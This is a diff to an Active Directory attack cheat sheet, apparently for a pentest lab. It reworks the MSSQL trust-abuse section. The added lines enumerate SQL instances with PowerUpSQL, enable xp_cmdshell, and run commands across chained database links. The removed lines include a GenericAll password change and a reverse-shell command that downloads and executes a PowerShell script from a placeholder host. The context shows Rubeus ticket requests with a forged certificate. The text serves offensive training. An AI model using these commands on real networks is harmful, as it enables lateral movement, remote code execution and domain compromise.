@@ -1418,70 +1418,84 @@ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template
 # Save the output and convet to esc3agent-EA.pfx
 # Pass the certificate to forest root
 Rubeus.exe asktgt /user:administrator /certificate:esc3agent-EA.pfx /password:SecretPass@123 /dc:mcorp-dc.moneycorp.local /user:moneycorp.local\administrator /ptt
-
-```
-
-
-
-
-
-### GenericAll Abused
-
-![Main Logo](images/Example_BloodHound_GenericAll.PNG 'Example_Generic')
-
-**1. Full control with GenericAll. Method to change the password:**
-```powershell
-# User password change
-Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user mickey.mouse newpassword /domain}
 ```
 
 # Trust Abuse MSSQL Servers
-
-#### Pre-requisites
+```powershell
+# MS SQL Server can be used for lateral movement because domain users can be mapped to Database roles.
+# Also because there can be couigfration 
+```
+#### Tools
 #### PowerUpSQL:
 ```powershell
 . .\PowerUpSQL.ps1
 ```
-Link: [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
-
-Software: [HeidiSQL Client](https://github.com/HeidiSQL/HeidiSQL)
 
 **1. Enumeration:**
 ```powershell
+
 # Discovery (SPN Scanning)
 Get-SQLInstanceDomain
-# Discovery (SPN Scanning) with Info and Verbose mode
-Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
-# Check accessibility
-Get-SQLConnectionTestThreaded
-# Check accessibility
+
+# Check accessibility for current user on found instances
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+
+# Getting more information on accessible Instances 
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Executing a query on accessible SQL Server:
+Get-SQLQuery -Instance dcorp-mgmt -Query "select @@version as version"
+
+# If we have SysAdmin role it's good!
+# because Sysadmin role can configure "Command Execution" feature (disabled by default)
+# Otherwise we need to find a way to get more privileged role one MS SQL
+Get-SQLQuery -Instance dcorp-mgmt -Query "EXEC sp_configure 'show advanced options', 1"
+Get-SQLQuery -Instance dcorp-mgmt -Query " GO"
+Get-SQLQuery -Instance dcorp-mgmt -Query "RECONFIGURE"
+Get-SQLQuery -Instance dcorp-mgmt -Query "GO"
+Get-SQLQuery -Instance dcorp-mgmt -Query "EXEC sp_configure 'xp_cmdshell', 1"
+Get-SQLQuery -Instance dcorp-mgmt -Query "GO"
+Get-SQLQuery -Instance dcorp-mgmt -Query "RECONFIGURE"
+Get-SQLQuery -Instance dcorp-mgmt -Query "GO"
+
+# Sysadmin role can configure "command Execution" feature
+Get-SQLQuery -Instance dcorp-mgmt -Query "select @@version as version"
+
+
+
 ```
+
 **2. Database Links:**
 ```powershell
-# Searching Database Links
+# Database Links allows a SQL Server to access data provided by another source (another SQL Server or OLE DB data source)
+# IN case of links to a SQL Server, ot's possibile to execute stored procedure across the link
+# Links works across forest trust
+
+# Enumerating Database Links
+# This also inform if rpcout is enabled (by default it's not
 Get-SQLServerLink -Instance dcorp-mssql -Verbose
-# Enumerating Database Links
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
-```
-```mysql
-# Searching Database Links
+
+# Or using a direct query on the SQL Server:
 select * from master..sysservers
-# Enumerating Database Links
-select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
-```
-**3. Command Execution:**
-```powershell
-# Command: whoami
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft
-# Reverse Shell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql.corp.corporate.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://<address>/Invoke-PowerShellTcp.ps1'')"'
-```
-```mysql
-# Enable xp_cmdshell
+
+# Enumerating Database Links chains (if there are "transitive" links between three servers
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+
+# or specifying a link (it can be also transitive)
+select * from openquery("dcorp-sql1",'select * from master..sysservers')
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from master..sysservers")')
+
+# Executeing a store procedure on a linked server:
 EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"
-# Command: whoami
+
+# Executing commands across Database LInks
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.corp.corporate.local -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget  eu-sql
+
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eurocorp.local",""select @@version as version; exec master..xp_cmdshell "powershell whoami""")")")')
+
+# Executing a remote whoami
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from openquery("eu-sql.eu.corporate.local",""select@@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
+
 ```
 
 # Forest Persistence DCShadow
